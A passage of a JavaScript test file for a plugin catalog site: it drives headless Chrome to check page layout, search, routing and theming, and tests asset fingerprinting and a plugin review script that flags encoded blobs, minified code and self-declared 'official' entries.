// the page's address without the theme the scenarios open it with
const at = (W) => { const q = new URLSearchParams(W.location.search); q.delete('theme'); return W.location.pathname + (q.toString() ? '?' + q : '') + W.location.hash; };
(async () => {
  const R = {};
  try {
    let { W, D } = await open('/');
    R.home = { theme: all(D, '#status .theme button').map(txt), errors: [] };
    all(D, '.h7d')[0].click(); await sleep(100);
    R.home.flow = { lit: all(D, '.h7flow path.h7on').map((p) => p.dataset.f), cap: txt(D.getElementById('h7cap')) };
    // a path starts on its room's edge, so any point of it inside a room means it runs through that room
    const m = D.querySelector('.h7map').getBoundingClientRect(), rooms = all(D, '.h7r').map((x) => [x.dataset.k, x.getBoundingClientRect()]);
    R.home.flow.through = [...new Set(all(D, '.h7flow path').flatMap((p) => {
      const out = [];
      for (let i = 2; i < p.getTotalLength() - 2; i += 2) {
        const q = p.getPointAtLength(i), x = q.x + m.left, y = q.y + m.top;
        for (const [k, b] of rooms) if (x > b.left + 1 && x < b.right - 1 && y > b.top + 1 && y < b.bottom - 1) out.push(p.dataset.f + ' through ' + k);
      }
      return out;
    }))];
    ({ W, D } = await open('/plugins/'));
    R.front = { doors: all(D, '.cf-d').map((d) => txt(d.querySelector('b')) + (d.classList.contains('shut') ? ' shut' : ' open')) };
    all(D, '.cf-pick .btn')[1].click(); await sleep(100);
    R.front.second = all(D, '.cf-d').map((d) => txt(d.querySelector('b')) + (d.classList.contains('shut') ? ' shut' : ' open'));
    // scrolled panes: nothing of what scrolls may show in the band under a frame's top border, where its title sits
    ({ W, D } = await open('/plugins/', 1440, 420));
    R.bleed = all(D, '.frame > .body, .home-pane > .home').filter((s) => !s.parentElement.parentElement.closest('.frame') && W.getComputedStyle(s).overflowY !== 'visible' && s.scrollHeight > s.clientHeight + 40).map((s) => {
      s.scrollTop = 120;
      const f = s.parentElement.getBoundingClientRect(), hits = new Set();
      for (let y = f.top + 2; y <= f.top + 12; y += 2) for (let i = 1; i < 20; i++) { const e = D.elementFromPoint(f.left + (f.width * i) / 20, y); if (e && e !== s && s.contains(e)) hits.add(e.tagName.toLowerCase()); }
      return txt(s.parentElement.querySelector(':scope > .t')) + ': ' + ([...hits].join(' ') || 'clean');
    });
    // a control focused while partly above a clipped pane's top lands clear of the clip (scroll-padding)
    R.focusTop = [['#tree .body', '#tree a.tr'], ['.home-pane > .home', '.home-pane > .home .btn']].map(([sc, el]) => {
      const s = D.querySelector(sc), e = all(D, el).filter((x) => x.offsetParent)[4] || D.querySelector(el);
      s.scrollTop = 0;
      s.scrollTop = e.getBoundingClientRect().top - s.getBoundingClientRect().top + 10;
      e.focus();
      return Math.round(e.getBoundingClientRect().top - s.getBoundingClientRect().top);
    });
    // a hash route from the site's first weeks lands on its page
    ({ W, D } = await open('/#/plugin/alpha/review?r=v1.0.0#x'));
    R.legacy = [at(W)];
    ({ W, D } = await open('/#/plugins/all?adds=previews'));
    R.legacy.push(at(W));
    // the query string is the browser's: the list with a filter, a review tab with a release
    ({ W, D } = await open('/plugins/all/?adds=previews'));
    R.live = { on: all(D, '#tree .tr.on').map(txt), rows: all(D, '#results a.lr .nm').map(txt), set: all(D, '.fbar .dd.set summary').map(txt) };
    ({ W, D } = await open('/plugins/all/?sort=constructor'));
    R.live.sort = [txt(D.querySelector('.srt summary b')), all(D, '#results a.lr').length];
    ({ W, D } = await open('/plugins/alpha/review/?r=v1.0.0'));
    R.live.review = { pressed: txt(D.querySelector('.relsel [aria-pressed=true]')), text: txt(D.querySelector('.info .body')), readme: txt(D.querySelector('.readme')) };
    ({ W, D } = await open('/plugins/gamma/'));
    ({ W, D } = await open('/'));
    const input = D.getElementById('tqIn');
    input.dispatchEvent(new W.FocusEvent('focusin', { bubbles: true }));
    R.search = { recent: all(D, '#tqList .gh').map(txt), first: [txt(D.querySelector('#tqList .it .l')), D.querySelector('#tqList .it').getAttribute('href')] };
    input.value = 'alp';
    input.dispatchEvent(new W.Event('input', { bubbles: true }));
    Object.assign(R.search, { open: D.getElementById('tq').classList.contains('on'), shown: !D.getElementById('tqList').hidden, items: all(D, '#tqList .it').map((a) => [txt(a.querySelector('.l')), a.getAttribute('href')]) });
    key(W, input, 'Escape');
    R.search.closed = !D.getElementById('tq').classList.contains('on') && D.getElementById('tqList').hidden;
    input.dispatchEvent(new W.FocusEvent('focusin', { bubbles: true }));
    input.value = 'updating';
    input.dispatchEvent(new W.Event('input', { bubbles: true }));
    R.search.docs = all(D, '#tqList .it').map((a) => [txt(a.querySelector('.l')), a.getAttribute('href')]);
    key(W, input, 'Escape');
    input.dispatchEvent(new W.FocusEvent('focusin', { bubbles: true }));
    input.value = 'requirements';
    input.dispatchEvent(new W.Event('input', { bubbles: true }));
    R.search.part = all(D, '#tqList .it').map((a) => [txt(a.querySelector('.l')), a.getAttribute('href')]);
    key(W, input, 'Escape');
    ({ W, D } = await open('/plugins/all/'));
    const dds = all(D, '.fbar .dd');
    dds[0].querySelector('summary').click(); await sleep(150);
    R.menus = { first: all(D, '.dd[open]').length };
    dds[1].querySelector('summary').click(); await sleep(150);
    R.menus.second = all(D, '.dd[open]').map((d) => dds.indexOf(d));
    R.rows = all(D, '#results a.lr').map(txt);
    const fq = D.getElementById('fq');
    fq.value = 'gam'; fq.dispatchEvent(new W.Event('input', { bubbles: true })); await sleep(100);
    R.typed = { rows: all(D, '#results a.lr .nm').map(txt), url: at(W) };
    ({ W, D } = await open('/plugins/alpha/'));
    R.plugin = { player: !!D.querySelector('.rec .ap-player') };
    const pause = D.querySelector('.rec [data-act=toggle]');
    pause.click(); await sleep(500);
    R.plugin.toggle = [txt(pause)];
    pause.click(); await sleep(500);
    R.plugin.toggle.push(txt(pause));
    R.plugin.gap = Math.round(D.querySelector('.rec .ap-player').getBoundingClientRect().height - D.querySelector('.rec .ap-term').getBoundingClientRect().height);
    R.plugin.clipped = {};
    for (const w of [320, 1024, 1280]) {
      const { D: d } = await open('/plugins/alpha/', w);
      R.plugin.clipped[w] = all(d, '.rband .rn').filter((e) => e.scrollWidth > e.clientWidth).map(txt);
    }
    R.gamma = { offGrid: {} };
    // gamma has no recording: the sketch in its place keeps everything under it on whole pixels (DESIGN.md §2.5)
    for (const w of [390, 1440]) {
      const { D: d } = await open('/plugins/gamma/', w);
      R.gamma.offGrid[w] = all(d, '.frame, .rband, .cmd, .btn').filter((e) => e.offsetParent && Math.abs(e.getBoundingClientRect().top % 1) > 0.02).map((e) => e.className);
      R.gamma.bands = all(d, '.noshot .gl i').filter((i) => i.style.clipPath).length;
    }
    ({ W, D } = await open('/', 390, 844));
    const bar = rect(D.getElementById('bar')), brand = rect(D.querySelector('.brand')), menu = rect(D.getElementById('drawerBtn')), field = rect(D.querySelector('.tqf'));
    R.phone = { bar, brand, menu, field, get: D.getElementById('getBtn'), theme: rect(D.querySelector('#status .theme')), vh: W.innerHeight, scrollW: D.documentElement.scrollWidth };
    D.getElementById('drawerBtn').click(); await sleep(200);
    R.phone.drawer = { shown: W.getComputedStyle(D.getElementById('tree')).display, foot: all(D, '#tree .sec').filter((x) => x.textContent.includes('this site')).flatMap((x) => all(x, '.tr .l')).map(txt), pressed: D.getElementById('drawerBtn').getAttribute('aria-expanded') };
    ({ W, D } = await open('/', 320, 700));
    R.narrow = { scrollW: D.documentElement.scrollWidth, brand: rect(D.querySelector('.brand')), menu: rect(D.getElementById('drawerBtn')) };
    ({ W, D } = await open('/'));
    all(D, '#status .theme button')[1].click(); await sleep(100);
    R.theme = { attr: D.documentElement.dataset.theme, pref: D.documentElement.dataset.pref, saved: W.localStorage.getItem('nerd-plugins-theme'), on: all(D, '#status .theme button[aria-pressed="true"]').map(txt) };
    ({ W, D } = await open('/install/'));
    const nav = document.querySelector('iframe'), next = new Promise((r) => (nav.onload = r));
    D.querySelector('#tree a[href="/security/"]').click();
    await next; await sleep(300);
    R.panel = { url: nav.contentWindow.location.pathname, mark: nav.contentDocument.documentElement.dataset.panel, tree: nav.contentDocument.getElementById('tree').classList.contains('focus'), main: all(nav.contentDocument, '#main .frame.focus').length };
  } catch (e) {
    R.error = String((e && e.stack) || e);
  }
  document.body.dataset.result = btoa(unescape(encodeURIComponent(JSON.stringify(R))));
})();
</script>`;

let driven;
/** Serves the site on a free port, opens drive.html in headless Chrome over its DevTools socket, and resolves with what the scenarios wrote. */
function drive() {
  driven ??= (async () => {
    const { out } = sites();
    fs.writeFileSync(path.join(out, 'drive.html'), DRIVE);
    // as GitHub Pages serves it: a folder by its index.html, anything else by 404.html
    const server = http.createServer((req, res) => {
      let f = path.join(out, decodeURIComponent(new URL(req.url, 'http://x').pathname));
      if (f.startsWith(out) && fs.existsSync(f) && fs.statSync(f).isDirectory()) f = path.join(f, 'index.html');
      if (!f.startsWith(out) || !fs.existsSync(f) || !fs.statSync(f).isFile()) return res.writeHead(404, { 'content-type': 'text/html' }).end(fs.readFileSync(path.join(out, '404.html')));
      const type = { '.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css', '.svg': 'image/svg+xml', '.json': 'application/json', '.wasm': 'application/wasm' }[path.extname(f)] ?? 'text/plain';
      res.writeHead(200, { 'content-type': type }).end(fs.readFileSync(f));
    });
    await new Promise((r) => server.listen(0, '127.0.0.1', r));
    const profile = tmp('chrome');
    const chrome = spawn(CHROME, ['--headless=new', '--disable-gpu', `--user-data-dir=${profile}`, '--remote-debugging-port=0', '--window-size=1440,900', '--disable-renderer-backgrounding', '--disable-background-timer-throttling', `http://127.0.0.1:${server.address().port}/drive.html`], { stdio: ['ignore', 'ignore', 'pipe'] });
    try {
      const port = await new Promise((resolve, reject) => {
        let log = '';
        chrome.stderr.on('data', (d) => { log += d; const m = log.match(/DevTools listening on ws:\/\/127\.0\.0\.1:(\d+)/); if (m) resolve(m[1]); });
        chrome.on('exit', () => reject(new Error('Chrome exited before it was ready')));
        setTimeout(() => reject(new Error('Chrome did not start')), 30000);
      });
      let page;
      for (let i = 0; i < 40 && !page; i++) {
        page = (await (await fetch(`http://127.0.0.1:${port}/json/list`)).json()).find((t) => t.type === 'page' && t.url.endsWith('/drive.html'));
        if (!page) await new Promise((r) => setTimeout(r, 250));
      }
      const sock = new WebSocket(page.webSocketDebuggerUrl);
      await new Promise((r) => (sock.onopen = r));
      const waiting = new Map();
      sock.onmessage = (m) => { const d = JSON.parse(m.data); waiting.get(d.id)?.(d); };
      let id = 0;
      const ask = (expression) => new Promise((r) => { waiting.set(++id, r); sock.send(JSON.stringify({ id, method: 'Runtime.evaluate', params: { expression } })); });
      for (let i = 0; i < 480; i++) {
        const v = (await ask("document.body && document.body.dataset.result || ''")).result?.result?.value;
        if (v) return JSON.parse(Buffer.from(v, 'base64').toString('utf8'));
        await new Promise((r) => setTimeout(r, 250));
      }
      throw new Error('the browser wrote no result');
    } finally {
      chrome.kill('SIGKILL');
      server.close();
      server.closeAllConnections();
      fs.rmSync(profile, { recursive: true, force: true, maxRetries: 5 });
    }
  })();
  return driven;
}
const ui = (name, fn) => test(name, { skip: !CHROME && 'no Chrome found (set CHROME)', timeout: 150000 }, async () => {
  const r = await drive();
  assert.equal(r.error, undefined, r.error);
  fn(r);
});

ui('the plans come alive: a door shows its path, another plugin redraws its sandbox', (r) => {
  assert.deepEqual(r.home.theme, ['System', 'Light', 'Dark'], 'the theme switch sits in the status line');
  assert.deepEqual(r.home.flow.lit, ['git'], 'a door shows its own path');
  assert.deepEqual(r.home.flow.through, [], 'every path goes around the rooms, none through one');
  assert.match(r.home.flow.cap, /your own process, outside the server’s sandbox/);
  assert.deepEqual(r.front.doors, ['nerd open', 'your files shut', 'the network open', 'coding agents shut']);
  assert.ok(r.front.second.length === 4 && r.front.second[0] === 'nerd open', 'another plugin redraws the plan');
  assert.deepEqual(r.bleed, ['nav: clean', 'plugins: clean'], 'nothing scrolls over a frame\'s top border');
  assert.ok(r.focusTop.every((t) => t >= 15), `a focused row or button lands clear of the clipped band: ${r.focusTop} px below the pane's top`);
});

ui('a hash route from the first weeks lands on its page, and the query string is drawn by the browser', (r) => {
  assert.deepEqual(r.legacy, ['/plugins/alpha/review/?r=v1.0.0#x', '/plugins/all/?adds=previews']);
  assert.deepEqual(r.live.on, ['previews2'], 'the filtered list lights its kind in the panel');
  assert.deepEqual(r.live.rows, ['alpha', 'gamma']);
  assert.deepEqual(r.live.set, ['adds: previews ▾']);
  assert.deepEqual(r.live.sort, ['Stars', 3], 'an unknown sort is the default');
  assert.equal(r.live.review.pressed.replace(/ .*/, ''), 'v1.0.0');
  assert.ok(r.live.review.text.includes('aaaaaaaaaa') && r.live.review.text.includes('1 July 2026') && !/pull request/.test(r.live.review.text));
  assert.match(r.live.review.readme, /Alpha previews database files\./, 'the README stays on the page');
  assert.deepEqual(r.typed, { rows: ['gamma'], url: '/plugins/all/?q=gam' }, 'typing in the filter keeps the address current');
});

ui('the search field lists results and Escape closes it', (r) => {
  assert.ok(r.search.open && r.search.shown);
  assert.deepEqual(r.search.items, [['alpha', '/plugins/alpha/'], ['Filter the list by “alp”', '/plugins/all/?q=alp']]);
  assert.ok(r.search.closed);
  assert.ok(r.search.docs.some(([l, h]) => l === 'Updating' && h === '/docs/usage/#updating'), 'it finds a section of the docs');
  assert.ok(r.search.part.some(([l, h]) => l === 'Requirements' && h === '/install/'), 'a section that is part of Install opens Install');
  assert.deepEqual([r.search.recent[0], r.search.first], ['recently viewed', ['gamma', '/plugins/gamma/']], 'the plugin opened last is first in the empty search field');
});

ui('the filter menus open one at a time', (r) => {
  assert.equal(r.menus.first, 1);
  assert.deepEqual(r.menus.second, [1]);
  assert.equal(r.rows.length, 3);
});

ui('the recording plays, its button pauses it, and a plugin without one stays on whole pixels', (r) => {
  assert.ok(r.plugin.player);
  assert.deepEqual(r.plugin.clipped, { 320: [], 1024: [], 1280: [] }, 'no room heading is cut off');
  assert.deepEqual(r.plugin.toggle, ['Play', 'Pause'], 'the page\'s own button pauses and plays the recording');
  assert.ok(r.plugin.gap <= 2, `the player is as high as its terminal (${r.plugin.gap}px more)`);
  assert.deepEqual(r.gamma.offGrid, { 390: [], 1440: [] }, 'a plugin page without a recording stays on whole pixels');
  assert.equal(r.gamma.bands, 12, 'the sketch\'s bands are shaped by the script, not by a style attribute');
});

ui('a click in the nav keeps the nav focused on the page it opens', (r) => {
  assert.deepEqual([r.panel.url, r.panel.mark, r.panel.tree, r.panel.main], ['/security/', 'set', true, 0], JSON.stringify(r.panel));
});

ui('the theme switch in the status line sets the theme and remembers only that', (r) => {
  assert.deepEqual([r.theme.attr, r.theme.pref, r.theme.saved, r.theme.on], ['light', 'light', 'light', ['Light']]);
});

ui('on a phone the logo comes first, the menu button is a square, and nothing runs off the side', (r) => {
  const p = r.phone;
  assert.equal(p.get, null, 'no Get nerd button');
  assert.ok(p.brand.x < p.field.x && p.field.x + p.field.w < p.menu.x && p.brand.x < 24, 'one row: the logo, the search field, the menu button');
  assert.ok(Math.abs((p.field.y + p.field.h / 2) - (p.menu.y + p.menu.h / 2)) < 1 && Math.abs(p.menu.w - p.menu.h) < 0.5, 'the field and a square menu button share the row');
  assert.ok(p.theme.y + p.theme.h >= p.vh - 1, 'the theme switch stays at the foot');
  assert.ok(p.scrollW <= 390 && r.narrow.scrollW <= 320, 'no sideways scroll');
  assert.ok(r.narrow.brand.x < r.narrow.menu.x && Math.abs(r.narrow.menu.w - r.narrow.menu.h) < 0.5);
  assert.deepEqual([p.drawer.shown, p.drawer.pressed, p.drawer.foot], ['block', 'true', ['About', 'Contact', 'Privacy', 'Legal']]);
});

test('the page asks for each of its files by a fingerprint of its content', () => {
  const { root, dir } = fixtureCatalog();
  const alpha = JSON.parse(fs.readFileSync(path.join(dir, 'alpha.json'), 'utf8'));
  const cast = (t) => `{"version":2,"width":80,"height":24}\n[0.1, "o", "${t}"]\n`;
  fs.writeFileSync(path.join(dir, 'alpha.json'), JSON.stringify({ ...alpha, cast: cast('one') }));
  const out = tmp('fp');
  build(out, dir, root, { nerdRepo, today: '2026-10-05', nerd: null });
  const html = page(out, '/plugins/alpha/review/');
  const refs = [...html.matchAll(/(?:src|href)="\/([^"#:]+\.(?:css|js))(\?v=([0-9a-f]+))?"/g)];
  assert.deepEqual(refs.map(([, file]) => file).sort(), ['app.js', 'catalog-front.css', 'catalog-front.js', 'data.js', 'home.css', 'home.js', 'pages.css', 'render.js', 'site.css', 'space.js', 'style.css', 'theme.js', 'vendor/asciinema-player/asciinema-player.css', 'vendor/asciinema-player/asciinema-player.min.js']);
  for (const [, file, , v] of refs) assert.equal(v, fingerprint(fs.readFileSync(path.join(out, file))), file);
  const first = JSON.parse(fs.readFileSync(path.join(out, 'catalog.json'), 'utf8')).plugins[0].cast.v;
  assert.equal(first, fingerprint(fs.readFileSync(path.join(out, 'casts', 'alpha.cast'))));
  fs.writeFileSync(path.join(dir, 'alpha.json'), JSON.stringify({ ...alpha, cast: cast('two') }));
  build(out, dir, root, { nerdRepo, today: '2026-10-05', nerd: null });
  assert.notEqual(JSON.parse(fs.readFileSync(path.join(out, 'catalog.json'), 'utf8')).plugins[0].cast.v, first, 'a new recording, a new fingerprint');
  assert.notEqual(fingerprint('a'), fingerprint('b'));
  assert.match(fs.readFileSync(path.join(out, 'app.js'), 'utf8'), /`\/casts\/\$\{encodeURIComponent\(el\.dataset\.cast\)\}\.cast\?v=\$\{encodeURIComponent\(el\.dataset\.fp\)\}`/);
  assert.ok(fs.readFileSync(path.join(out, 'render.js'), 'utf8').includes('href="/catalog.json"'), 'the About page links the data');
});

/** Runs scripts/review.sh on a plugin made of `files`, with nerd and the scanners stubbed; `stubs` replaces tools. */
function review(files, stubs = {}, over = {}) {
  const plugin = catalogRepo([['2026-10-01', { LICENSE: 'MIT License', 'plugin.json': '{}', ...files }]]);
  const realGit = execFileSync('/bin/sh', ['-c', 'command -v git'], { encoding: 'utf8' }).trim();
  execFileSync(realGit, ['-C', plugin, 'tag', 'v1.0.0']);
  const commit = execFileSync(realGit, ['-C', plugin, 'rev-parse', 'HEAD'], { encoding: 'utf8' }).trim();
  const repo = catalogRepo([['2026-10-01', { 'revoked.json': '[]' }], ['2026-10-02', { 'plugins/x.json': entry({ commit, ...over }) }]]);
  const base = execFileSync(realGit, ['-C', repo, 'rev-parse', 'HEAD~1'], { encoding: 'utf8' }).trim();
  const bin = tmp('bin');
  const tools = {
    git: `case " $* " in *" clone "*) for a; do d=$a; done; exec "${realGit}" clone --quiet --no-checkout "${plugin}" "$d";; esac; exec "${realGit}" "$@"`,
    nerd: `[ "$1" = --plugin-check ] && echo '{"name":"x","version":"1.0.0","risk":0,"problems":[]}'; exit 0`,
    gitleaks: 'exit 0', 'osv-scanner': 'exit 0', guarddog: 'exit 0', yr: 'exit 0', ...stubs,
  };
  for (const [name, body] of Object.entries(tools)) fs.writeFileSync(path.join(bin, name), `#!/bin/sh\n${body}\n`, { mode: 0o755 });
  const out = tmp('out');
  const script = path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'scripts', 'review.sh');
  const env = { ...process.env, PATH: `${bin}:${process.env.PATH}`, YARA_RULES: '/dev/null' };
  let ok = true;
  let stderr = '';
  try { execFileSync(script, [base, out], { cwd: repo, env, stdio: ['ignore', 'ignore', 'pipe'] }); } catch (err) { ok = false; stderr = String(err.stderr); }
  // an entry refused before the plugin is fetched leaves no result.json, only its reason
  const result = path.join(out, 'result.json');
  return { ok, problems: fs.existsSync(result) ? JSON.parse(fs.readFileSync(result, 'utf8')).problems : [stderr.trim()] };
}

test('the review catches a long encoded blob and fails when a check cannot run', () => {
  const b64 = (n) => Buffer.from('x'.repeat(n)).toString('base64').slice(0, n);
  assert.deepEqual(review({ 'a.sh': 'echo hi\n' }), { ok: true, problems: [] });
  assert.deepEqual(review({ 'a.sh': `x=${b64(600)}\n` }).problems, ['a.sh holds a long encoded blob'], 'one line of base64');
  assert.deepEqual(review({ 'a.sh': `x=${'0123456789abcdef'.repeat(30)}\n` }).problems, ['a.sh holds a long encoded blob'], 'hex');
  assert.deepEqual(review({ 'a.sh': `x="\n${`${b64(76)}\n`.repeat(8)}"\n` }).problems, ['a.sh holds a long encoded blob'], 'wrapped');
  assert.deepEqual(review({ 'a.sh': `x=${b64(390)}\n` }).problems, []);
  assert.deepEqual(review({ 'a.js': `${'f(1);'.repeat(201)}\n` }).problems, ['a.js has a line over 1000 characters: minified or obfuscated code is not accepted']);
  const grep = review({ 'a.sh': 'echo hi\n' }, { grep: 'case "$1" in -r*) exit 2;; esac; exec /usr/bin/grep "$@"' });
  assert.equal(grep.ok, false);
  assert.match(grep.problems.join('\n'), /a check did not run \(exit 2\): grep/);
  const awk = review({ 'a.sh': 'echo hi\n' }, { awk: 'case " $* " in *lines.awk*) exit 2;; esac; exec /usr/bin/awk "$@"' });
  assert.equal(awk.ok, false);
  assert.deepEqual(awk.problems.sort(), ['LICENSE', 'a.sh', 'plugin.json'].map((f) => `the line checks did not run on ${f}`));
});

test('the review refuses an entry that says it is official', () => {
  const refused = { ok: false, problems: ['official is derived by the site, never set in an entry'] };
  assert.deepEqual(review({}, {}, { official: true }), refused);
  assert.deepEqual(review({}, {}, { official: false }), refused);
  assert.deepEqual(review({}), { ok: true, problems: [] });
});

test('the review reads a recording as a recording: long event lines pass, encoded blobs in it do not', () => {
  const peek = fs.readFileSync(path.join(fixtures, 'review', 'peek.cast'), 'utf8');
  assert.ok(peek.split('\n').some((l) => l.length > 1000), 'the fixture has the long lines that were refused');
  assert.deepEqual(review({ 'demo.cast': peek }), { ok: true, problems: [] });
  assert.deepEqual(review({ 'docs/demo.cast': peek }).problems, ['docs/demo.cast has a line over 1000 characters: minified or obfuscated code is not accepted'], 'only the recording the site shows');
  const blob = `${peek.split('\n')[0]}\n[0.1,"o","${Buffer.from('x'.repeat(600)).toString('base64')}"]\n`;
  assert.deepEqual(review({ 'demo.cast': blob }).problems, ['demo.cast holds a long encoded blob']);
});
